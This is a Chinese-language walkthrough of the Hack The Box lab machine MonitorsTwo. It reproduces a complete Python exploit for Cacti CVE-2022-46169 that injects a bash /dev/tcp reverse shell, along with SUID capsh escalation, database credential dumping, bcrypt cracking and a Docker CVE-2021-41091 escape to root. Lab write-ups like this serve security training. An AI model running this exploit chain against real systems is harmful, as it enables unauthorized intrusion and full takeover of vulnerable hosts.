# MonitorsTwo

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 目标探测

Nmap对目标端口进行全端口扫描

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# nmap -n -v -sS -p- 10.10.11.211 --max-retries=0 -oN allport.txt -Pn
# Nmap 7.94 scan initiated Wed Aug 30 02:15:07 2023 as: nmap -n -v -sS -p- --max-retries=0 -oN allport.txt -Pn 10.10.11.211
Warning: 10.10.11.211 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.11.211
Host is up (0.41s latency).
Not shown: 38872 closed tcp ports (reset), 26661 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Aug 30 02:25:59 2023 -- 1 IP address (1 host up) scanned in 652.10 seconds
```

可以看到目标开放了两个端口，接下来对开放的两个端口进行详细的扫描

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# nmap -n -v -sC -sV -p $(cat allport.txt | grep ^[0-9]|cut -d / -f1|tr '\n' ','|sed s/,$//) 10.10.11.211 -oN nmap.txt -Pn
# Nmap 7.94 scan initiated Wed Aug 30 02:26:33 2023 as: nmap -n -v -sC -sV -p 22,80 -oN nmap.txt -Pn 10.10.11.211
Nmap scan report for 10.10.11.211
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 30 02:27:25 2023 -- 1 IP address (1 host up) scanned in 51.63 seconds
```

这里没有什么有用的东西，先访问目标80端口看看

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

是一个登录框，可以看到这个页面Cacti 1.2.22版本，我们先searchsploit

Cacti 是一个用于监控和图形化显示网络设备性能数据的开源网络图形工具。它提供了一个基于Web的用户界面，允许网络管理员收集、存储和图形化显示各种网络设备的性能数据，以便更好地理解和分析网络的运行状况。

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# searchsploit cacti 1.2.22           
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
Cacti v1.2.22 - Remote Command Execution (R | php/webapps/51166.py
-------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

这是个命令注入的exp，但是这个exp不能在这里不能利用，在GitHub上面搜索该CVE-2022-46169编号，找到一个反弹shell的exp

{% embed url="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py" %}

{% code title="CVE-2022-46169.py" fullWidth="false" %}
```
import requests, optparse, sys
import urllib

def get_arguments():
    parser= optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url_target', help='The url target')
    parser.add_option('', '--LHOST', dest='lhost', help='Your ip')
    parser.add_option('', '--LPORT', dest='lport', help='The listening port')
    (options, arguments) = parser.parse_args()
    if not options.url_target:
        parser.error('[*] Pls indicate the target URL, example: -u http://10.10.10.10')
    if not options.lhost:
        parser.error('[*] Pls indicate your ip, example: --LHOST=10.10.10.10')
    if not options.lport:
        parser.error('[*] Pls indicate the listening port for the reverse shell, example: --LPORT=443')
    return options

def checkVuln():
    r = requests.get(Vuln_url, headers=headers)
    return (r.text != "FATAL: You are not authorized to use this service" and r.status_code != 403)

def bruteForcing():
    for n in range(1,5):
        for n2 in range(1,10):
            id_vulnUrl = f"{Vuln_url}?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={n2}"
            r = requests.get(id_vulnUrl, headers=headers)
            if r.text != "[]":
                RDname = r.json()[0]["rrd_name"]
                if RDname == "polling_time" or RDname == "uptime":
                    print("Bruteforce Success!!")
                    return True, n, n2
    return False, 1, 1

def Reverse_shell(payload, host_id, data_ids):
    PayloadEncoded = urllib.parse.quote(payload)
    InjectRequest = f"{Vuln_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
    r = requests.get(InjectRequest, headers=headers)


if __name__ == '__main__':
    options = get_arguments()
    Vuln_url = options.url_target + '/remote_agent.php'
    headers = {"X-Forwarded-For": "127.0.0.1"}
    print('Checking...')
    if checkVuln():
        print("The target is vulnerable. Exploiting...")
        print("Bruteforcing the host_id and local_data_ids")
        is_vuln, host_id, data_ids = bruteForcing()
        myip = options.lhost
        myport = options.lport
        payload = f"bash -c 'bash -i >& /dev/tcp/{myip}/{myport} 0>&1'"
        if is_vuln:
            Reverse_shell(payload, host_id, data_ids)
        else:
            print("The Bruteforce Failled...")

    else:
        print("The target is not vulnerable")
        sys.exit(1)

```
{% endcode %}

用该脚本利用漏洞

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.16.3 --LPORT=8889
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

监听端口返回一个shell

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.211] 40194
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 权限提升

查找一下具有suid权限位的文件

```
bash-5.1$ find / -user root -perm -4000 -print 2>/dev/null             
find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/bash
/bin/su
```

注意/sbin/capsh这个具有suid权限位，通过搜索发现这个可以用来提权

```
bash-5.1$ capsh --gid=0 --uid=0 --
capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

获取pyt

```
script -c /bin/bash /dev/null
```

正如我们所看到的，我们已经连接到了 Docker 容器，而不是主机。

```
bash-5.1$ hostname -I
hostname -I
172.19.0.3
```

.dockerenv这表明我们当前处于docker容器当中，查看一下entrypoint.sh这个文件

```
www-data@50bca5e748b0:/$ ls -alh 
ls -alh
total 84K
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 .
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root 4.0K Mar 22 13:21 bin
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 boot
drwxr-xr-x   5 root root  340 Aug 30 04:28 dev
-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Mar 21 10:49 etc
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 home
drwxr-xr-x   1 root root 4.0K Nov 15  2022 lib
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 lib64
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 media
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 mnt
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 opt
dr-xr-xr-x 266 root root    0 Aug 30 04:28 proc
drwx------   1 root root 4.0K Mar 21 10:50 root
drwxr-xr-x   1 root root 4.0K Nov 15  2022 run
drwxr-xr-x   1 root root 4.0K Jan  9  2023 sbin
drwxr-xr-x   2 root root 4.0K Mar 22 13:21 srv
dr-xr-xr-x  13 root root    0 Aug 30 04:28 sys
drwxrwxrwt   1 root root 4.0K Aug 30 08:28 tmp
drwxr-xr-x   1 root root 4.0K Nov 14  2022 usr
drwxr-xr-x   1 root root 4.0K Nov 15  2022 var
```

在系统根目录中，我们可以找到一个可以读取 SQL 文件的脚本

```
www-data@50bca5e748b0:/$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

下面我们尝试查询数据库中的用户名和密码

```
bash-5.1$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth";
<--password=root cacti -e "select * from user_auth";
id      username        password        realm   full_name       email_addressmust_change_password     password_change show_tree       show_list       show_preview  graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts  policy_graph_templates  enabled lastchange      lastlogin       password_history      locked  failed_attempts lastfail        reset_perms
1       admin   Anh202020       0       Jamie Thompson  admin@monitorstwo.htbon       on      on      on      on      2       1       1       1       1    on       -1      -1      -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on   on       on      on      on      3       1       1       1       1       1    -1       -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 0Marcus Brune    marcus@monitorstwo.htb                  on      on      on   on       1       1       1       1       1       on      -1      -1           on       0       0       2135691668
```

可以看到marcus  这个用户它的密码是个hash 我们用jhon去破解一下这个密文

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:05 0.04% (ETA: 2023-09-01 18:27) 0g/s 110.1p/s 110.1c/s 110.1C/s gomez..flower2
0g 0:00:01:06 0.04% (ETA: 2023-09-01 18:12) 0g/s 110.2p/s 110.2c/s 110.2C/s meatloaf..myfriends
funkymonkey      (?)     
1g 0:00:01:17 DONE (2023-08-30 22:37) 0.01293g/s 110.3p/s 110.3c/s 110.3C/s 474747..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

现在我们尝试一下ssh连接一下

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/MonitorsTwo]
└─# ssh marcus@10.10.11.211 
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 31 Aug 2023 02:44:03 AM UTC

  System load:                      0.0
  Usage of /:                       63.4% of 6.73GB
  Memory usage:                     23%
  Swap usage:                       0%
  Processes:                        262
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:cb16


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Wed Aug 30 18:53:18 2023 from 10.10.14.54
```

我们越过了docker限制，再次尝试提权，用linpeas.sh这个脚本去查找有没有可以利用的东西

{% embed url="https://github.com/carlospolop/PEASS-ng/releases/tag/20230827-2ed3749a" %}

```
marcus@monitorstwo:/tmp$ wget http://10.10.16.3:8888/linpeas.sh
--2023-08-31 03:09:20--  http://10.10.16.3:8888/linpeas.sh
Connecting to 10.10.16.3:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 848317 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[=================>] 828.43K   113KB/s    in 7.3s    

2023-08-31 03:09:29 (113 KB/s) - ‘linpeas.sh’ saved [848317/848317]
```

注意有两条被标红色的记录

```
╔══════════╣ Mails (limit 50)
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/findmnt -t                                                                    
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
```

这是一封电子邮件，他们在其中讨论了发现的漏洞以及应该修复的漏洞。 在我们的例子中，我们必须看最后一个。 这是一个 Docker 漏洞，我们可以在主机上执行容器命令。

```
marcus@monitorstwo:/tmp$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

这里可以利用exp去提权但是我下面用手动的方式去提权

{% embed url="https://github.com/UncleJ4ck/CVE-2021-41091" %}

该脚本将提示您确认是否在 Docker 容器中的 /bin/bash 上正确设置了 setuid 位。如果答案是“是”，脚本将检查主机是否易受攻击并迭代可用的overlay2文件系统。如果系统确实容易受到攻击，脚本将尝试通过在易受攻击的路径（您在 /bin/bash 上执行 setuid 命令的 Docker 容器的文件系统）中生成 shell 来获取 root 访问权限

我们必须首先使用 findmnt 命令找到容器的路径。

<pre><code>marcus@monitorstwo:/tmp$ findmnt

<strong>├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
</strong></code></pre>

cd到这个目录当中

```
marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```

在容器中，作为 root，我们必须将 bash 赋予 SUID 权限。

```
root@50bca5e748b0:/var/www/html# chmod u+s /bin/bash
chmod u+s /bin/bash
root@50bca5e748b0:/var/www/html# ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

在主机上，我们从容器运行 bash 以成为 root。

```
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ /bin/bash -p                          
bash-5.1# whoami
root
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# 
```
